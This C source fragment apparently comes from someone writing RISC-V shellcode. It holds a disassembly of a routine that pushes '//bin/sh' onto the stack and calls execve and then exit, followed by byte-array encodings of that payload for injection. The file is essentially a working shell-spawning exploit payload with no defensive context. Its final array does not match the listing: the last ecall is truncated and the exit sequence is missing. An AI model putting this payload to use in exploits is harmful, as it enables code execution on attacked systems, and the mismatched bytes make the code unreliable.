/*
0000000000010078 <_start>:
   10078:	69623537          	lui	a0,0x69623
   1007c:	f2f5051b          	addiw	a0,a0,-209
   10080:	1161                	addi	sp,sp,-8
   10082:	e02a                	sd	a0,0(sp)
   10084:	687338b7          	lui	a7,0x68733
   10088:	f6e8889b          	addiw	a7,a7,-146
   1008c:	01113223          	sd	a7,4(sp)
   10090:	4881                	li	a7,0
   10092:	01110893          	addi	a7,sp,17
   10096:	4501                	li	a0,0
   10098:	fef88513          	addi	a0,a7,-17 # 68732fef <__global_pointer$+0x68721739>
   1009c:	4601                	li	a2,0
   1009e:	4581                	li	a1,0
   100a0:	4885                	li	a7,1
   100a2:	0dc88893          	addi	a7,a7,220
   100a6:	00000073          	ecall
   100aa:	4501                	li	a0,0
   100ac:	4881                	li	a7,0
   100ae:	05d88893          	addi	a7,a7,93
   100b2:	00000073          	ecall
 */
//unsigned char code[] = "\x01\x45\x81\x48\x93\x88\xd8\x05\x73";
//const unsigned char code[] = "\x37\x35\x62\x69\
//			\x1b\x05\xf5\xf2\
//			\x61\x11\
//			\x2a\xe0\
//			\xb7\x38\x73\x68\
//			\x9b\x88\xe8\xf6\
//			\x23\x32\x11\x01\
//			\x81\x48\
//			\x93\x08\x11\x01\
//			\x01\x45\
//			\x13\x85\xf8\xfe\
//			\x01\x46\
//			\x81\x45\
//			\x85\x48\
//			\x93\x88\xc8\x0d\
//			\x01\x46\
//			\x01\x46\
//			\x73";

//TODO stack alignment and why the last two li a2,0's were needed
const unsigned char code[] = "\x37\x35\x62\x69\x1b\x05\xf5\xf2\x61\x11\x2a\xe0\xb7\x38\x73\x68\x9b\x88\xe8\xf6\x23\x32\x11\x01\x81\x48\x93\x08\x11\x01\x01\x45\x13\x85\xf8\xfe\x01\x46\x81\x45\x85\x48\x93\x88\xc8\x0d\x01\x46\x01\x46\x73";
